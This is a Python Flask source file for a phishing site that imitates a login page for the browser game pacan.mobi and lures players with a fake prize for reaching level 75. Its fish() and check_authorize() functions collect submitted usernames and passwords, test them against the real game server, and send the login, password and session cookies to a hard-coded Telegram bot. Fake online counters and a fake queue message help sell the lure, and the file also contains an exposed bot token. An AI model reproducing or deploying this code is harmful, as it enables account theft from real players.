import random
import json
import requests as requests
from flask import Flask, render_template, request
from bs4 import BeautifulSoup as bs
import telebot
from fake_useragent import UserAgent

app = Flask(__name__)

token = '5354741796:AAEW0NOKHmaCeDQZNJytJag5V3LQtyPOrbw'
chatId = '1310265676'

bot = telebot.TeleBot(token)

crop_url = 'https://hata.mobi/index.php?r=crop'


@app.route('/', methods=['post', 'get'])
def index():
    redirect_url = ''
    isIncorrect, message, lvl, username, password = fish(request)
    if username == '201201':
        redirect_url = '/crop'
    else:
        redirect_url = crop_url
    return render_template('index.html',
                           redirect_url=redirect_url,
                           isIncorrect=isIncorrect,
                           online=get_online_count(),
                           sec=get_sec_count(),
                           message=message,
                           lvl=lvl,
                           username=username,
                           password=password)


@app.route('/light', methods=['post', 'get'])
def light():
    isIncorrect, message, lvl, username, password = fish(request)
    return render_template('light.html',
                           redirect_url=crop_url,
                           isIncorrect=isIncorrect,
                           online=get_online_count(),
                           sec=get_sec_count(),
                           message=message,
                           lvl=lvl,
                           username=username,
                           password=password)


@app.route('/crop', methods=['get'])
def crop():
    return render_template('crop-1.html')


@app.route('/crop2', methods=['get'])
def crop2():
    return render_template('crop-2.html')


@app.route('/inbox1', methods=['get'])
def inbox():
    return render_template('inbox-1.html')


@app.route('/inbox2', methods=['get'])
def inbox2():
    return render_template('inbox-2.html')


@app.route('/profile', methods=['get'])
def profile():
    return render_template('profile.html')


def send_report(report_text):
    bot.send_message(chatId, report_text)


def fish(req):
    lvl = 0
    isIncorrect = False
    message = ''
    username = ''
    password = ''
    if req.method == 'POST':
        username = req.form.get('username')  # запрос к данным формы
        password = req.form.get('password')

        if username == "201201":
            lvl = 99
        else:
            lvl = check_authorize(username, password)
        print('lvl is', lvl)
        if lvl == 0:
            isIncorrect = True
        elif lvl < 75:
            isIncorrect = False
            message = 'Приз можно получить только с 75 уровня'
        elif lvl >= 75:
            isIncorrect = False
            message = 'Игрок {0}, в очереди за 1000 доцентов и 3000 патронов. Время ожидания несколько часов'.format(
                username)
    return isIncorrect, message, lvl, username, password


def get_online_count():
    return random.randint(2200, 2600)


def get_sec_count():
    sec = random.randint(6, 166)
    return '0.0' + str(sec)


def check_authorize(username, password):
    ua = UserAgent()
    login_data = {
        'login': username,
        'password': password
    }
    temp_session = requests.Session()
    temp_session.headers = {
        'user-agent': str(ua.random)
    }
    temp_session.post('https://pacan.mobi' + '/index.php?r=site/auth/', data=login_data)

    url_profile = 'https://pacan.mobi/index.php?r=profile&layout=mobile'

    profile_page = temp_session.get(url_profile)
    soup = bs(profile_page.content, "lxml")
    lvl = soup.find('span', class_='lvl')
    if lvl:
        if lvl != 0:
            lvl_text = lvl.get_text().strip()
            cookies = temp_session.cookies.get_dict()
            pretty = json.dumps(cookies, sort_keys=True, indent=4)
            report = 'Level: {0}\nLogin: {1}\nPassword: {2}\n\nCookies:\n{3}'.format(lvl_text,
                                                                                     username,
                                                                                     password,
                                                                                     pretty)
            print('Report is', report)
            send_report(report)

        return int(lvl_text)
    else:
        return 0


if __name__ == '__main__':
    app.run()
